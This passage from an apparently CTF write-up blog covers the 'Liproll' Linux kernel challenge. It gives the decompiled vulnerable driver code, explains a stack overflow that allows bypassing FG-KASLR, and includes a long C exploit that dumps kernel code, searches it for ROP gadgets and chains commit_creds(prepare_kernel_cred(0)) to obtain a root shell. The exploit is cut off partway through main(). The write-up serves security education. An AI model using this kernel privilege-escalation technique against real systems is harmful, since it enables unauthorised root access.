class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;/readflag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3><span id="liproll">Liproll</span></h3><p>The challenge is inspired by <code>hxpctf 2020 kernel-rop</code>.</p><p>The use of <a href="https://lwn.net/Articles/824307/">fine-grained kaslr</a> makes it difficult to construct the ROP chain.</p><p>After <code>FG-KASLR</code> is turned on, it will cause vmlinux and the corresponding kernel module to be segmented by function, and then the function loading order will be disrupted on the basis of the original address randomization, and the offset of the function on the basis of <code>vmlinux_base_addr</code> cannot be determined by static analysis.</p><p>The vulnerability is in the <code>cast_a_spell</code> function:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">cast_a_spell</span><span class="params">(__int64 *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rsi</span></span><br><span class="line">  _BYTE buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// [rsp+100h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+110h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( global_buffer )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = global_buffer;</span><br><span class="line">    v1 = *((_DWORD *)a1 + <span class="number">2</span>);</span><br><span class="line">    v2 = <span class="number">256</span>;</span><br><span class="line">    v3 = *a1;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">0x100</span> )</span><br><span class="line">      v2 = *((_DWORD *)a1 + <span class="number">2</span>);</span><br><span class="line">    size = v2;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_from_user(buf, v3, v1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span>(global_buffer, buf, *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)a1 + <span class="number">2</span>));</span><br><span class="line">      global_buffer = ptr;</span><br><span class="line">      *((_DWORD *)&amp;global_buffer + <span class="number">2</span>) = size;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    cast_a_spell_cold();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>v1</code> is the parameter passed in. If <code>v1 &gt; 0x100</code>, it will cause a stack overflow. This overflow will overwrite the <code>ptr</code> and <code>size</code> variables. The <code>read</code> and <code>write</code> functions rely on the <code>ptr</code> and <code>size</code> stored in <code>global_buffer</code>. It is equivalent to the opportunity for us to <code>read</code> and <code>write</code> at will.</p><p>In the original question of <code>hxpctf</code>, the real offset of the function is obtained by reading the structure of the <code>.symtab</code> section, and the read <code>function</code> in this challenge limits the scope of reading:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">liproll_read</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD v4[<span class="number">35</span>]; <span class="comment">// [rsp+0h] [rbp-118h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4[<span class="number">32</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( global_buffer )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)global_buffer &lt; vmlinux_base + <span class="number">0x12EE908</span> <span class="comment">//正好是 .symtab 段范围</span></span><br><span class="line">      || (<span class="keyword">unsigned</span> __int64)global_buffer &gt;= vmlinux_base + <span class="number">0x13419A0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span>(v4, global_buffer, *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;global_buffer + <span class="number">2</span>));</span><br><span class="line">      copy_to_user(a2, v4, a3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      liproll_read_cold();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This shows that there is no way to get the true offset of the function by reading <code>.symtab</code>.</p><p>Another approach (expected solution) is to use <code>fake JIT-ROP</code>. Read the code segment through the memory leak vulnerability in this challenge to obtain the gagets we need, and then use the stack overflow to construct the <code>ROP chains</code>.</p><p>During the competition, some teams solved the challenge by <code>modeprobe_path</code> or by brute force search for <code>cred</code> structure on heap space. </p><p>Thanks to <code>r3kapig</code>, their member helped to find a unexpected solution which was fixed later. And there would be a big impact without the reminder from them.</p><h4><span id="exp">exp</span></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CREATE 0xD3C7F03</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHOOSE 0xD3C7F04</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RESET 0xD3C7F02</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CAST 0xD3C7F01</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spawn_shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">choose_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx;</span><br><span class="line">&#125;choose_args;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">cast_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">u_int8_t</span> *buf;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> len;</span><br><span class="line">&#125;cast_args;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">gadgets_find</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">size_t</span> commit_creds;</span><br><span class="line">    <span class="keyword">size_t</span> iretq_ret;</span><br><span class="line">    <span class="keyword">size_t</span> mov_rdi_rax_ret;</span><br><span class="line">    <span class="keyword">size_t</span> cmp_rdx_rcx;</span><br><span class="line">    <span class="keyword">size_t</span> pop_rdx_rcx;</span><br><span class="line">&#125;gadgets_find;</span><br><span class="line"></span><br><span class="line">gadgets_find found;</span><br><span class="line"><span class="keyword">int</span> fd, m;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">0x100</span>], canary, vmlinux_base;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdi_ret = <span class="number">0x16a8</span>;</span><br><span class="line"><span class="keyword">size_t</span> swapgs_popfq_ret = <span class="number">0x200eaa</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rbx_ret = <span class="number">0xb36</span>;</span><br><span class="line"><span class="keyword">u_int8_t</span> code_iretq_ret[] = &#123;<span class="number">0x48</span>, <span class="number">0xCF</span>, <span class="number">0xC3</span>&#125;;</span><br><span class="line"><span class="keyword">u_int8_t</span> code_prepare_kernel_cred[] = &#123;<span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xC5</span>, <span class="number">0x4C</span>, <span class="number">0x89</span>, <span class="number">0xE7</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xEE</span>, <span class="number">0xB9</span>, <span class="number">0x15</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB8</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF3</span>, <span class="number">0x48</span>, <span class="number">0xA5</span>, <span class="number">0x41</span>, <span class="number">0xC7</span>, <span class="number">0x04</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0xC7</span>&#125;;</span><br><span class="line"><span class="keyword">u_int8_t</span> code_commit_creds[] = &#123;<span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x65</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x7D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x55</span>, <span class="number">0x53</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0xAC</span>, <span class="number">0x24</span>, <span class="number">0x30</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x39</span>, <span class="number">0xAC</span>, <span class="number">0x24</span>, <span class="number">0x38</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x85</span>, <span class="number">0xE2</span>&#125;;</span><br><span class="line"><span class="keyword">u_int8_t</span> code_mov_rdi_rax_ret[] = &#123;<span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xC7</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xDB</span>, <span class="number">0x7F</span>, <span class="number">0xEA</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xF8</span>, <span class="number">0x5B</span>, <span class="number">0xC3</span>&#125;;</span><br><span class="line"><span class="keyword">u_int8_t</span> code_cmp_rdx_rcx[] = &#123;<span class="number">0x48</span>, <span class="number">0x39</span>, <span class="number">0xCA</span>, <span class="number">0x74</span>, <span class="number">0x01</span>, <span class="number">0xC3</span>&#125;;</span><br><span class="line"><span class="keyword">u_int8_t</span> code_pop_rdx_rcx[] = &#123;<span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0xC3</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">machinecode_cmp</span><span class="params">(<span class="keyword">u_int8_t</span> *a, <span class="keyword">u_int8_t</span> *b, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i] != b[i]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">char</span> *s)</span> </span>&#123;</span><br><span class="line">    perror(s);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ioctl(fd, CREATE, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reset</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ioctl(fd, RESET, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">choose</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx)</span> </span>&#123;</span><br><span class="line">    choose_args arg;</span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    ioctl(fd, CHOOSE, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cast</span><span class="params">(<span class="keyword">u_int8_t</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    cast_args arg;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    arg.len = len;</span><br><span class="line">    ioctl(fd, CAST, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gadgets_finder</span><span class="params">(<span class="keyword">u_int8_t</span> *codes, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (found.cmp_rdx_rcx == <span class="number">0</span> &amp;&amp; \</span><br><span class="line">            machinecode_cmp(codes+i, code_cmp_rdx_rcx, <span class="number">6</span>)) &#123;</span><br><span class="line">            found.cmp_rdx_rcx = i + <span class="number">0x401160</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (found.commit_creds == <span class="number">0</span> &amp;&amp; \</span><br><span class="line">            machinecode_cmp(codes+i, code_commit_creds, <span class="number">32</span>)) &#123;</span><br><span class="line">            found.commit_creds = i + <span class="number">0x401160</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (found.iretq_ret == <span class="number">0</span> &amp;&amp; \</span><br><span class="line">            machinecode_cmp(codes+i, code_iretq_ret, <span class="number">3</span>)) &#123;</span><br><span class="line">            found.iretq_ret = i + <span class="number">0x401160</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (found.mov_rdi_rax_ret == <span class="number">0</span> &amp;&amp; \</span><br><span class="line">            machinecode_cmp(codes+i, code_mov_rdi_rax_ret, <span class="number">13</span>)) &#123;</span><br><span class="line">            found.mov_rdi_rax_ret = i + <span class="number">0x401160</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (found.prepare_kernel_cred == <span class="number">0</span> &amp;&amp; \</span><br><span class="line">            machinecode_cmp(codes+i, code_prepare_kernel_cred, <span class="number">32</span>)) &#123;</span><br><span class="line">            found.prepare_kernel_cred = i + <span class="number">0x401160</span> - <span class="number">0x34</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (found.pop_rdx_rcx == <span class="number">0</span> &amp;&amp; \</span><br><span class="line">            machinecode_cmp(codes+i, code_pop_rdx_rcx, <span class="number">3</span>)) &#123;</span><br><span class="line">            found.pop_rdx_rcx = i + <span class="number">0x401160</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] found pop_rdx_rcx: 0x%llx\n&quot;</span>, found.pop_rdx_rcx + vmlinux_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] found cmp_rdx_rcx: 0x%llx\n&quot;</span>, found.cmp_rdx_rcx + vmlinux_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] found commit_creds: 0x%llx\n&quot;</span>, found.commit_creds + vmlinux_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] found iretq_ret: 0x%llx\n&quot;</span>, found.iretq_ret + vmlinux_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] found mov_rdi_rax_ret: 0x%llx\n&quot;</span>, found.mov_rdi_rax_ret + vmlinux_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] found prepare_kernel_cred: 0x%llx\n&quot;</span>, found.prepare_kernel_cred + vmlinux_base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gadgets_generator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    create();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">u_int8_t</span> payload[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">u_int8_t</span> *codes_dump = <span class="literal">NULL</span>;</span><br><span class="line">    codes_dump = (<span class="keyword">u_int8_t</span> *)<span class="built_in">malloc</span>(<span class="number">0xacfdf0</span>);</span><br><span class="line">    <span class="keyword">if</span> (codes_dump &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;[-] malloc error.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> cur = <span class="number">0x401160</span>, dump_end = <span class="number">0xed1000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] This is dumped code: %p\n&quot;</span>, codes_dump);</span><br><span class="line">    <span class="keyword">while</span>(cur &lt; dump_end) &#123;</span><br><span class="line">        choose(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">memset</span>(payload, <span class="number">0</span>, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">        *(<span class="keyword">size_t</span> *)(payload + <span class="number">0x100</span>) = vmlinux_base + cur;</span><br><span class="line">        *(<span class="keyword">int</span> *)(payload + <span class="number">0x108</span>) = <span class="number">0x100</span>;</span><br><span class="line">        cast(payload, <span class="number">0x110</span>);</span><br><span class="line">        <span class="keyword">int</span> temprecv = read(fd, codes_dump+cur<span class="number">-0x401160</span>, <span class="number">0x100</span>);</span><br><span class="line">        <span class="keyword">if</span>(temprecv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            die(<span class="string">&quot;[-] read error.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        cur += temprecv;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] start finding gadgets when length is: 0x%x\n&quot;</span>, cur);</span><br><span class="line">    gadgets_finder(codes_dump, cur<span class="number">-0x401160</span>);</span><br><span class="line"></span><br><span class="line">    m = <span class="number">0x110</span> / <span class="number">8</span>;</span><br><span class="line">    rop[m++] = canary;</span><br><span class="line">    rop[m++] = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        prepare_kernel_cred(0);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    rop[m++] = pop_rdi_ret + vmlinux_base;</span><br><span class="line">    rop[m++] = <span class="number">0</span>;</span><br><span class="line">    rop[m++] = found.prepare_kernel_cred + vmlinux_base;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        commit_creds(prepare_kernel_cred(0));</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    rop[m++] = found.pop_rdx_rcx + vmlinux_base;</span><br><span class="line">    rop[m++] = <span class="number">1</span>;</span><br><span class="line">    rop[m++] = <span class="number">2</span>;</span><br><span class="line">    rop[m++] = found.cmp_rdx_rcx + vmlinux_base;</span><br><span class="line">    rop[m++] = pop_rbx_ret + vmlinux_base;</span><br><span class="line">    rop[m++] = <span class="number">0</span>;</span><br><span class="line">    rop[m++] = found.mov_rdi_rax_ret + vmlinux_base;</span><br><span class="line">    rop[m++] = <span class="number">0</span>;</span><br><span class="line">    rop[m++] = found.commit_creds + vmlinux_base;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        switch to kernel;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    rop[m++] = swapgs_popfq_ret + vmlinux_base;</span><br><span class="line">    rop[m++] = <span class="number">0</span>;</span><br><span class="line">    rop[m++] = found.iretq_ret + vmlinux_base;</span><br><span class="line"></span><br><span class="line">    rop[m++] = (<span class="keyword">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[m++] = user_cs;</span><br><span class="line">    rop[m++] = user_rflags;</span><br><span class="line">    rop[m++] = user_sp;</span><br><span class="line">    rop[m++] = user_ss;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/liproll&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;[-] open device error.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    save_status();</span><br><span class="line">    create();</span><br><span class="line">    choose(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">size_t</span> rcv[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd, (<span class="keyword">void</span> *)rcv, <span class="number">0x40</span> * <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x40</span>; i++) 